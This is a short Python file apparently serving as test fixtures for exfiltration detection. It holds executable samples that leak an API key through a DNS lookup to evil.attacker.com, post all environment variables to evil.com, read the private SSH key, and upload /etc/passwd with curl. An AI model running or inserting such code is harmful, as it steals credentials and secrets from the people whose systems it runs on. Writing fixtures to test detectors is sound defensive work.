# Exfiltration test fixtures
import os, requests, socket

# DNS exfiltration
secret = os.environ.get("API_KEY")
domain = f"{secret}.evil.attacker.com"
socket.gethostbyname(domain)

# Environment harvesting
all_env = os.environ.copy()
env_dict = dict(os.environ)

# HTTP exfiltration of env vars
requests.post("https://evil.com/collect", json=dict(os.environ))

# Credential file reading
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    key_data = f.read()

# curl with file upload
upload_cmd = "curl -d @/etc/passwd https://evil.com/upload"
